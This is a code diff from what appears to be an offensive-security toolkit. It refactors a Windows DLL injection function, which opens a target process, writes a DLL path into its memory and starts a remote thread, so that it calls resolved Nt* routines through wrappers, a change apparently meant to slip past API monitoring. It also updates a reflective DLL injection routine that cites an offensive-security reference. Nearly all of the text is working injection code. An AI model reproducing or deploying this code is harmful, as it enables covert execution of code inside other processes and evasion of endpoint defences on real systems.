@@ -14,40 +14,51 @@ typedef struct BASE_RELOCATION_ENTRY {
 
 namespace Technique::Injection
 {
-    BOOL DLLInjection(DWORD dwPID, LPVOID lpDllPath, size_t dwDllPathSize)
+    BOOL DLLInjection(Procs::PPROCS pProcs, DWORD dwPID, LPVOID lpDllPath, size_t dwDllPathSize)
     {
         HANDLE hProcess;
         HANDLE hThread;
         PVOID remoteBuffer;
-        BOOL bResults;
 
-        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+        hProcess = System::Process::ProcessOpen(
+            pProcs,
+            dwPID,
+            PROCESS_ALL_ACCESS
+        );
         if (!hProcess)
         {
             return FALSE;
         }
-        
-        remoteBuffer = VirtualAllocEx(
+
+        remoteBuffer = System::Process::VirtualMemoryAllocate(
+            pProcs,
             hProcess,
-            NULL,
             dwDllPathSize,
-            MEM_COMMIT,
+            MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE
         );
         if (!remoteBuffer)
         {
+            pProcs->lpNtClose(hProcess);
             return FALSE;
         }
 
-        bResults = WriteProcessMemory(
+        if (!System::Process::VirtualMemoryWrite(
+            pProcs,
             hProcess,
             remoteBuffer,
             lpDllPath,
             dwDllPathSize,
             NULL
-        );
-        if (!bResults)
-        {
+        )) {
+            System::Process::VirtualMemoryFree(
+                pProcs,
+                hProcess,
+                &remoteBuffer,
+                0,
+                MEM_RELEASE
+            );
+            pProcs->lpNtClose(hProcess);
             return FALSE;
         }
 
@@ -57,34 +68,47 @@ namespace Technique::Injection
         );
         if (!threadStartRoutineAddr)
         {
+            System::Process::VirtualMemoryFree(
+                pProcs,
+                hProcess,
+                &remoteBuffer,
+                0,
+                MEM_RELEASE
+            );
+            pProcs->lpNtClose(hProcess);
             return FALSE;
         }
 
-        hThread = CreateRemoteThread(
+        hThread = System::Process::RemoteThreadCreate(
+            pProcs,
             hProcess,
-            NULL,
-            0,
             threadStartRoutineAddr,
-            remoteBuffer,
-            0,
-            NULL
+            remoteBuffer
         );
         if (!hThread)
         {
+            System::Process::VirtualMemoryFree(
+                pProcs,
+                hProcess,
+                &remoteBuffer,
+                0,
+                MEM_RELEASE
+            );
+            pProcs->lpNtClose(hProcess);
             return FALSE;
         }
 
-        WaitForSingleObject(hThread, INFINITE);
+        pProcs->lpNtWaitForSingleObject(hThread, FALSE, NULL);
 
-        CloseHandle(hProcess);
-        CloseHandle(hThread);
+        pProcs->lpNtClose(hProcess);
+        pProcs->lpNtClose(hThread);
 
         return TRUE;
     }
 
     // Reference:
     // https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
-    BOOL ReflectiveDLLInjection(LPCWSTR lpDllPath, size_t dwDllPathSize)
+    BOOL ReflectiveDLLInjection(Procs::PPROCS pProcs, LPCWSTR lpDllPath, size_t dwDllPathSize)
     {
         using LPPROC_DLLMAIN = BOOL(WINAPI*)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
 
